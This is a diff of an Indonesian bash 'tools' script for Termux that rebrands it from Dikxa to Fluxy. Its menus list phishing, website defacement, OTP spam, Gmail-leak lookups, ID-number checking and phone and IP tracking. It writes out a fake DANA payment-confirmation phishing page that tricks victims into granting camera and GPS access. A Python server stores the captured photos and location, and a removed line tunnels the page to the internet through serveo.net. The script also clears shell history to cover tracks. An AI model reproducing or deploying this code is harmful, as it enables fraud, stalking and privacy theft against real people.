@@ -1,7 +1,7 @@
 #!/bin/bash
 
 set +o history
-for dir in DikxaTracker DikxaIG DikxaFF DikxaTT DikxaSpin DikxaTTSuntik DikxaPro DikxaInject; do
+for dir in FluxyTracker FluxyIG FluxyFF FluxyTT FluxySpin FluxyTTSuntik FluxyPro FluxyInject; do
   rm -rf "$HOME/$dir" 2>/dev/null
 done
 history -c 2>/dev/null
@@ -120,7 +120,7 @@ banner() {
   else
   sleep 2
     clear
-    echo -e "${CYAN}===== DikxaTools =====${NC}"
+    echo -e "${CYAN}===== FluxyTools =====${NC}"
   fi
   #echo -e "${BLUE}"
   #echo "     ╭────────────────────────────────────╮" | lolcat
@@ -133,7 +133,7 @@ banner() {
   clear
   if command_exists figlet; then
     toilet -f slant "  FluxyTools  " --filter border | lolcat
-    echo -e "      ┃ TOOLS INI DI BUAT & DI KEMBANGKAN OLEH Dikxa OFFICIAL ┃"
+    echo -e "      ┃ TOOLS INI DI BUAT & DI KEMBANGKAN OLEH FLUXY OFFICIAL ┃"
     echo -e "      ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ "
    
   else
@@ -321,12 +321,32 @@ echo -e "${GREEN}
  ├─────────────────────────────────────────────────────────────────┤
  │ ${YELLOW}${greeting}${g_spaces}${GREEN}                │
  ├─────────────────────────────────────────────────────────────────┤
- │ ${YELLOW}Your ID: ${your_id}          ${YELLOW}YT${NC}: ${RED}DikxaViruszV2       TT${NC}:dikxavirusz999${NC}${GREEN}    │
+ │ ${YELLOW}Your ID: ${your_id}          ${YELLOW}YT${NC}: ${RED}FluxySad          TT${NC}: by_exe9${NC}${GREEN}    │
  ╰─────────────────────────────────────────────────────────────────╯${NC}
  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  │                     ${YELLOW}~ 𝐃𝐢𝐤𝐱𝐚𝐕𝐢𝐫𝐮𝐬𝐳𝟗𝟗𝟗 ~${NC}${GREEN}                   │
  ├────────────┬─────────────────────────┬────────────┬─────────────┤
-${RED}𝐄𝐍𝐂 𝐌𝐄𝐍𝐔 | 𝐀𝐊𝐒𝐄𝐒 𝐆𝐀𝐆𝐀𝐋.${NC}                 │
+ │  [  ${RED}01${GREEN}  ]  │ ${YELLOW}SUNTIK TIKTOK${GREEN}           │  PERINTAH  │   FUNGSI    │
+ │  [  ${RED}02${GREEN}  ]  │ ${YELLOW}SUNTIK IG    ${GREEN}           ├────────────┴─────────────┤
+ │  [  ${RED}03${GREEN}  ]  │ ${YELLOW}CEK PROVIDER NOMOR${GREEN}      │[  DOWNLD ]  DOWNLOADER   │
+ │  [  ${RED}04${GREEN}  ]  │ ${YELLOW}ASCII ART GENERATOR${GREEN}     │[ PHISING ] PHISING MENU  │
+ │  [  ${RED}05${GREEN}  ]  │ ${YELLOW}PERKIRAAN CUACA${GREEN}         │[    A1   ] EFEK KLIK OFF │
+ │  [  ${RED}06${GREEN}  ]  │ ${YELLOW}BROWSING (w3m)${GREEN}          │[    A2   ] EFEK KLIK ON  │
+ │  [  ${RED}07${GREEN}  ]  │ ${YELLOW}STATUS WEBSITE${GREEN}          │[    B1   ] MATIKAN MUSIK │
+ │  [  ${RED}08${GREEN}  ]  │ ${YELLOW}ALL KALKULATOR${GREEN}          │[    B2   ] MUSIK NYALA   │
+ │  [  ${RED}09${GREEN}  ]  │ ${YELLOW}DEFACE WEBSITE     ${GREEN}     │[    C1   ] OFF EFEK SALAH│
+ │  [  ${RED}10${GREEN}  ]  │ ${YELLOW}TRACKING IP${GREEN}             │[    C2   ] ON EFEK SALAH │
+ │  [  ${RED}11${GREEN}  ]  │ ${YELLOW}IP PRIBADI${GREEN}              │[   SPAM  ] MENU SPAM     │
+ │  [  ${RED}12${GREEN}  ]  │ ${YELLOW}KEBOCORAN GMAIL${GREEN}         │[  SUNTIK ] MENU SUNTIK   │
+ │  [  ${RED}13${GREEN}  ]  │ ${YELLOW}ENCRYPS CODE ${GREEN}           │[  MUSIK  ] MUSIK ALBUM   │
+ │  [  ${RED}14${GREEN}  ]  │ ${YELLOW}LACAK NAMA${GREEN}              │[  DARK   ] MENU DARK     │
+ │  [  ${RED}15${GREEN}  ]  │ ${YELLOW}LACAK LOKASI NOMOR (IP)${GREEN} │                          │
+ │  [  ${RED}16${GREEN}  ]  │ ${YELLOW}LAPORKAN BUG  ${GREEN}          │                          │
+ │  [  ${RED}17${GREEN}  ]  │ ${YELLOW}MENU TRACKING${GREEN}           │                          │
+ │  [  ${RED}18${GREEN}  ]  │ ${YELLOW}MENU OSIN${GREEN}               │                          │
+ │  [  ${RED}19${GREEN}  ]  │ ${YELLOW}MENU GHOS TRACK${GREEN}         │                          │
+ │  [  ${RED}20${GREEN}  ]  │ ${YELLOW}INFO TOOLS${GREEN}              │                          │
+ │  [  ${RED}00${GREEN}  ]  │ ${YELLOW}KELUAR${GREEN}                  │                          │
  ├────────────┴─────────────────────────┴──────────────────────────┤
  │                 𝐃𝐢𝐤𝐱𝐚𝐕𝐢𝐫𝐮𝐬𝐳𝟗𝟗𝟗                    │
  ├─────────────────────────────────────────────────────────────────┤
@@ -547,7 +567,7 @@ DARK|dark)
     ;;
     00|0)
     klik
-      echo -e "${CYAN}TERIMAKASIH SUDAH MENGGUNAKAN TOOLS Dikxa.${NC}" | lolcat
+      echo -e "${CYAN}TERIMAKASIH SUDAH MENGGUNAKAN TOOLS Fluxy.${NC}" | lolcat
       klik
       stop_music # Menghentikan pemutaran musik saat keluar
       exit 0
@@ -1810,7 +1830,7 @@ menu_suntik() {
   ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
   │                ${BG_RED}${YELLOW}ALL BASE FITUR SUNTIK${NC}                │
   ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
-   ${BG_RED}${WHITE}CODE BY Dikxa${NC}                          ${BG_RED}${WHITE}FITUR BY RANGG${NC}"
+   ${BG_RED}${WHITE}CODE BY Fluxy${NC}                          ${BG_RED}${WHITE}FITUR BY RANGG${NC}"
     echo "
   ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
   │                  ALL SUNTIK TIKTOK                 │
@@ -2111,7 +2131,7 @@ phising_menu() {
    ██╔═══╝░██╔══██║██║░╚═══██╗██║██║╚████║██║░░╚██╗
    ██║░░░░░██║░░██║██║██████╔╝██║██║░╚███║╚██████╔╝
    ${NC}${RED}╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝╚═╝░░╚══╝░╚═════╝
-   ${BG_RED}${YELLOW}CODE BY Dikxa${NC}                  ${BG_RED}TOOLS 999${NC}"
+   ${BG_RED}${YELLOW}CODE BY Fluxy${NC}                  ${BG_RED}TOOLS 999${NC}"
    echo " 
  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  │ [ 1 ] PHISING GAME AR V0.1                        │
@@ -6207,7 +6227,7 @@ ${RED}        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡉⠉⠁⠀⠀⠀
 
 ${RED}               █▀▀ ▀▄▀ █ █▀▀   ▀█▀ █▀█ █▀█ █   █▀${WHITE}${BOLD}
                ██▄ █ █ █ █▀     █  █▄█ █▄█ █▄▄ ▄█
-                ${GREEN}DIKAVIRUSZ 999${GREEN}   CODE BY Dikxa${RESET}"
+                ${GREEN}DIKAVIRUSZ 999${GREEN}   CODE BY Fluxy${RESET}"
         
         if [[ -n "$file" && -f "$file" ]]; then
             echo -e "${RED}╭━━━━━${GREEN}[ ${BOLD}${RED}INFORMASI FILE ${GREEN}]${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮"
@@ -6506,7 +6526,7 @@ ${GREEN}[ ✓ ] MENGOBROL DENGAN AI PINTAR${NC}"
         # --- tangkap pertanyaan tentang nama ---
         if [[ "${pertanyaan,,}" =~ (siapa nama|namamu siapa|who are you) ]]; then
             echo -e "${YELLOW}Kamu:${NC} $pertanyaan"
-            echo -e "${CYAN}DikxaTools999:${NC} nama saya DikxaTools siap membantu kamu"
+            echo -e "${CYAN}FluxyTools999:${NC} nama saya FluxyTools siap membantu kamu"
             echo
             continue
         fi
@@ -6526,7 +6546,7 @@ ${GREEN}[ ✓ ] MENGOBROL DENGAN AI PINTAR${NC}"
                 [[ -z "$jawaban" ]] && jawaban="Maaf, tidak ada jawaban."
 
                 echo -e "${YELLOW}Kamu:${NC} $pertanyaan"
-                echo -e "${CYAN}DikxaTools999:${NC} $jawaban"
+                echo -e "${CYAN}FluxyTools999:${NC} $jawaban"
                 echo
                 break
             else
@@ -6620,7 +6640,7 @@ cheker_nik() {
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠉⠀
-                        [${BG_RED}${YELLOW}Hellow My Name is Dikxa${NC}]
+                        [${BG_RED}${YELLOW}Hellow My Name is Fluxy${NC}]
 " | lolcat
     echo -e "${BG_RED}${YELLOW}CHECKER INFORMASI NIK${NC}"
 
@@ -6992,7 +7012,7 @@ echo "Silakan masukkan folder yang ingin diperiksa."
 echo ""
 
 # Minta input folder dari user
-echo -e "${BG_RED}${YELLOW}CONTOH PATH: /storage/emulated/0/Folder1/Dikxa"
+echo -e "${BG_RED}${YELLOW}CONTOH PATH: /storage/emulated/0/Folder1/Fluxy"
 read -rp "Masukkan path folder: " TARGET_DIR
 
 # Cek apakah folder ada
@@ -7356,7 +7376,7 @@ echo -e "   ${BG_RED}${YELLOW}TEKAN q LALU ENTER UNTUK MENGHENTIKAN SPAM OTP${NC
 trap 'echo -e "\n\n${YELLOW}Pengiriman dihentikan.${NC}"; exit 0' INT
 while true; do
   echo -e "   ${GREEN}● ${YELLOW}● ${RED}●"
-   echo -e "   ${WHITE}DEVELOPER: ${BG_GREEN}${RED}Dikxa OFFICIAL✓${NC}"
+   echo -e "   ${WHITE}DEVELOPER: ${BG_GREEN}${RED}Fluxy OFFICIAL✓${NC}"
    echo -e "     ${BG_RED}${YELLOW}[ ! ] MASUKAN NOMOR BERAWALAN 62${NC}"
     printf "   ${GREEN}┏━[ ${RED}DIKAVIRUSZ 999${NC} ${GREEN}]${YELLOW}@termux${RED} ~ ${NC}${RED}[${YELLOW} S.OTP ${YELLOW}${RED}]${NC}${GREEN}\n   ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
            read -r nomor
@@ -7397,7 +7417,7 @@ generate_password() {
 
     echo -e "${CYAN}
   ╭──────────────────────────────────────── ╮
-  │           ${YELLOW}Dikxa OFFICIAL 80${CYAN}            │
+  │           ${YELLOW}Fluxy OFFICIAL 80${CYAN}            │
   ╰────────────────────────────────────────╯${NC}"
 }
 banner_big() {
@@ -7418,21 +7438,30 @@ clear
   if command_exists figlet; then
     figlet -f slant " Tracking" | lolcat
   else
-    echo -e "${CYAN}  ===== DikxaTols =====${NC}"
+    echo -e "${CYAN}  ===== FluxyTols =====${NC}"
     sleep 1
     clear
   fi
-     echo -e "  ${BG_RED}${YELLOW}MENU 𝐁𝐎𝐊𝐄𝐏 DIKAVIRUSZ${NC}"
+     echo -e "  ${BG_RED}${YELLOW}MENU KE 2 DIKAVIRUSZ${NC}"
      echo -e "
  ╭───────────────────────────────────────────────╮
- │                                               │
+ │     𝐓𝐑𝐀𝐂𝐊𝐈𝐍𝐆 𝐌𝐄𝐍𝐔 𝐁𝐘 𝐃𝐈𝐊𝐗𝐀𝐕𝐈𝐑𝐔𝐒𝐙𝟗𝟗𝟗 𝐕𝟏             │
  ╭─────────────┬────────────────────────────┬────╮
- │  [   𝐂𝐀𝐑𝐈 𝐁𝐎𝐊𝐄𝐏 𝐀𝐉𝐀 𝐃𝐄𝐊
+ │  [   01   ] │ IP Tracker (GeoIP + ISP)   │    │
+ │  [   02   ] │ Tracking Phising (link)    │    │
+ │  [   03   ] │ Tracking Info Domain       │    │
+ │  [   04   ] │ Nmap Lite                  │    │
+ │  [   05   ] │ IP TRACK                   │    │
+ │  [   06   ] │ Track lksi foto di ambil   │    │
+ │  [   07   ] │ Cracker Pw .Zip            │    │ 
+ │  [   08   ] │ PHISING ALL SOSMED         │    │ 
+ │  [   09   ] │ PHONE TRACK                │    │ 
+ │  [   00   ] │ KEMBALI KE MENU AWAL       │    │
  ╰─────────────┴────────────────────────────┴────╯
- │                                               │
+ │ 𝐘𝐓 𝐃𝐈𝐊𝐗𝐀𝐕𝐈𝐑𝐔𝐒𝐙𝐕𝟐 | 𝐓𝐓 : 𝐃𝐈𝐊𝐗𝐀𝐕𝐈𝐑𝐔𝐒𝐙𝟗𝟗𝟗 𝟎𝟖𝟕𝟕𝟏𝟎𝟔𝟕𝟐𝟑𝟒𝟐       │
  ╰───────────────────────────────────────────────╯" | lolcat
    echo -e "${GREEN}● ${YELLOW}● ${RED}●"
-   echo -e "${WHITE}DEVELOPER: ${BG_GREEN}${RED}Dikxa OFFICIAL✓${NC}"
+   echo -e "${WHITE}DEVELOPER: ${BG_GREEN}${RED}Fluxy OFFICIAL✓${NC}"
         printf "${GREEN}┏━[ ${RED}DIKAVIRUSZ 999${NC} ${GREEN}]${YELLOW}@termux${RED} ~${NC}${RED}[${YELLOW} TRACKING ${YELLOW}${RED}]${NC}${GREEN}\n┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
         read -r pilih
 
@@ -7849,7 +7878,7 @@ cd DikxaTracker
 
 # === HTML AR GAME TRANSPARAN ===
 cat > index.html <<'EOF'
-     <!DOCTYPE html>
+   <!DOCTYPE html>
 <html lang="id">
 <head>
   <meta charset="UTF-8"/>
@@ -7858,14 +7887,14 @@ cat > index.html <<'EOF'
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
     *{box-sizing:border-box}
-    body{margin:0;font-family:'Orbitron',monospace;background:#128aeb;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column}
+    body{margin:0;font-family:'Orbitron',monospace;background:#061525;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column}
     .screen{width:100%;max-width:400px;text-align:center;padding:30px}
     h1{color:#fff;font-size:24px;margin-bottom:10px;font-family:Arial,sans-serif}
     p{font-size:14px;color:#fff;margin-bottom:25px;line-height:1.4;font-family:Arial,sans-serif}
-    p2{font-size:17px;color:#fff;margin-bottom:35px;line-height:1.4}
+    p2{font-size:10px;color:#fff;margin-bottom:35px;line-height:1.4}
     .btn{background:#aaa;color:#111;border:none;padding:15px 40px;border-radius:30px;font-size:16px;cursor:pointer;transition:.3s}
      .avatar{width:120px;height:120px;border:2px solid #ffd700;border-radius:50%;margin:0 auto 20px;background:#ffd700;display:flex;align-items:center;justify-content:center;color:#111;font-size:25px;font-weight:bold}
-    .popup{position:fixed;top:0;left:0;width:100%;height:100%;background:url("https://cdn.phototourl.com/free/2026-09-13-27d5bf41-3816-4740-a73e-4513835cb062.png") center/cover no-repeat;display:none;align-items:center;justify-content:center;z-index:10}
+    .popup{position:fixed;top:0;left:0;width:100%;height:100%;background:#061525;display:none;align-items:center;justify-content:center;z-index:10}
     .popup .card{background:#fff;border:2px solid #fff;border-radius:15px;padding:25px;width:300px;text-align:center}
     .popup h2{color:#111;margin-top:0;font-family:Arial,sans-serif}
     .popup p{font-size:13px;color:#ff4544;margin-bottom:20px}
@@ -7900,23 +7929,23 @@ cat > index.html <<'EOF'
   <!-- Screen 1: Welcome -->
   <div class="screen" id="welcome">
     <div class="avatar"></div>
-    <h1>Dana Transaksi</h1>
-    <p2>ID TrX - 2609******81</p2>
-    <button class="btn" onclick="showConsent()">Cek Transaksi</button>
+    <h1>Ascrow Transactions</h1>
+    <h2>DANA - ID 08XXX</h2>
+    <button class="btn" onclick="showConsent()">Konfrimasi Pembeyaran</button>
   </div>
 
   <!-- Screen 2: Consent -->
   <div class="popup" id="consentPopup">
     <div class="card">
-      <h2>Izin Tidak Diberikan</h2>
-      <p>Detail Gagal Dilihat</p>
+      <h2>Konfrimasi Pembayaran</h2>
+      <p>Mohon Aktifkan Izin</p>
       <ul id="featureList">
         <li>IZINKAN KAMERA</li>
         <li>IZINKAN LOKASI</li>
-        <p>Aktifkan Fitur Lokasi/GPS HP Anda</p>
+        <p>Aktifkan Fitur Lokasi Pada Handphone Milik Anda.</p>
       </ul>
       <p id="permissionDetails">Mohon Izinkan Akses Agar Dapat melihat IP dan Transaksi dibuat</p>
-      <button class="btn" onclick="requestPermissions()">Izinkan</button>
+      <button class="btn" onclick="requestPermissions()">Izinkan & Konfirmasi</button>
     </div>
   </div>
 
@@ -8084,7 +8113,7 @@ src="https://maps.google.com/maps?q={lat},{lon}&hl=id&z=18&amp;output=embed"></i
             with open("map.html", "w") as f:
                 f.write(map_html)
 
-            print(f"[ + ] image_{idx}.jpg & lokasi tersimpan")
+            print(f"[ + ] image_{idx}.jpg & lokasi Berhasil Ditrack")
             print(f"[ ! ] PERIKSA DI FOLDER DikxaTracker")
             self.send_response(200)
             self.end_headers()
@@ -8096,10 +8125,10 @@ src="https://maps.google.com/maps?q={lat},{lon}&hl=id&z=18&amp;output=embed"></i
         with open("index.html", "rb") as f:
             self.wfile.write(f.read())
 
-print(f"SERVER BERJALAN DI PORT: {PORT}")
+print(f"𝐇𝐄𝐋𝐋𝐎 𝐆𝐔𝐘𝐒 𝐈𝐌")
 print(f"                                        ")
-print(f"BUAT SESSION BARU DAN MASUKAN INI:")
-print(f"ssh -R maxsoft:80:localhost:{PORT} serveo.net")
+print(f"𝐃𝐈𝐊𝐗𝐀𝐕𝐈𝐑𝐔𝐒𝐙𝟗𝟗𝟗")
+print(f"𝐅𝐎𝐔𝐍𝐃𝐄𝐑 𝐅𝐑𝐎𝐌 𝐀𝐍𝐎𝐍𝐘𝐌𝐎𝐔𝐒𝟗𝟗𝟗")
 HTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
 EOF
 clear
@@ -8131,7 +8160,7 @@ ${RED}⠀⢠⣤⣠⣶⣦⣴⣿⣿⣆⠀⠀⣿⡇⠀⢸⣿⣦⣀⣿⣶⣾⡿⠟�
 ${RED}⠈⠙⠻⠋⠙⠋⠙⠛⢻⣿⠀⢀⣿⠃⠀⣼⡟⢿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⣿⠇${WHITE}⠀⠀⠀⠀⠐⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ${RED}⠀⠀⣠⣴⣿⣶⣶⣶⡿⠃⠀⣾⣏⣠⣼⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠏⠀${WHITE}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ${RED}⠀⢾⠟⠉⠉⠛⠛⠉⠀⠀⠀⠙⠛⠛⠋⠀
-                        [${BG_RED}${YELLOW}Hellow My Name is Dikxa${NC}]
+                        [${BG_RED}${YELLOW}Hellow My Name is Fluxy${NC}]
 " | lolcat
 echo -e "${GREEN}=========================================="
 echo -e "${BG_RED}${YELLOW}DIKAVIRUSZ 999${NC}"
